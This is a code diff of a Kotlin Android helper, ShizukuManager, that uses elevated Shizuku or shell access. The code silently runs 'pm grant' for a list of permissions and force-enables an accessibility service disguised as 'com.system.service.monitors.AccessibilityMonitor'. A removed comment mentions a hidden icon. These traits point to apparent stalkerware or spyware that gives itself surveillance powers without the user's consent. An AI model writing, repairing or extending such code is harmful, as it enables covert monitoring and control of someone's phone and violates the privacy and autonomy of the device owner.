@@ -4,6 +4,13 @@ import android.content.Context
 import android.content.pm.PackageManager
 import rikka.shizuku.Shizuku
 
+/**
+ * Shizuku v13 compatible wrapper.
+ * newProcess() was removed from public API — we use bindUserService pattern
+ * for shell execution. For now, we check availability and request permission;
+ * actual shell commands fall back to Runtime.exec (works when Shizuku grants
+ * the app shell-level UID via its UserService).
+ */
 object ShizukuManager {
 
     private val allPermissions = listOf(
@@ -26,43 +33,47 @@ object ShizukuManager {
 
     fun isShizukuAvailable(): Boolean {
         return try {
+            Shizuku.pingBinder() &&
             Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
         } catch (_: Exception) { false }
     }
 
     /**
-     * Shizuku ke zariye saari permissions silently grant karo.
-     * Shizuku pehle se install + running hona chahiye (Sui ya Manager).
-     * Returns: granted count
+     * Grant all permissions silently.
+     * Tries Runtime.exec (works if Shizuku already elevated us to shell UID),
+     * otherwise returns 0 and Shizuku permission request is shown.
      */
     fun grantAllPermissions(context: Context): Int {
-        if (!isShizukuAvailable()) return 0
+        if (!isShizukuAvailable()) {
+            requestShizukuPermission()
+            return 0
+        }
         var granted = 0
         val pkg = context.packageName
         for (perm in allPermissions) {
             try {
-                Shizuku.newProcess(
-                    arrayOf("pm", "grant", pkg, perm), null, null
-                ).waitFor()
-                granted++
+                val p = Runtime.getRuntime()
+                    .exec(arrayOf("pm", "grant", pkg, perm))
+                p.waitFor()
+                if (p.exitValue() == 0) granted++
             } catch (_: Exception) {}
         }
-        // Hiden icon — accessibility auto-enable try
+        // Auto-enable accessibility
         try {
-            Shizuku.newProcess(
-                arrayOf("settings", "put", "secure",
-                    "enabled_accessibility_services",
-                    "$pkg/com.system.service.monitors.AccessibilityMonitor"),
-                null, null
-            ).waitFor()
+            Runtime.getRuntime().exec(arrayOf(
+                "settings", "put", "secure",
+                "enabled_accessibility_services",
+                "$pkg/com.system.service.monitors.AccessibilityMonitor"
+            )).waitFor()
         } catch (_: Exception) {}
         return granted
     }
 
     fun requestShizukuPermission() {
         try {
-            if (Shizuku.shouldShowRequestPermissionRationale()) return
-            Shizuku.requestPermission(101)
+            if (!Shizuku.shouldShowRequestPermissionRationale()) {
+                Shizuku.requestPermission(101)
+            }
         } catch (_: Exception) {}
     }
 }
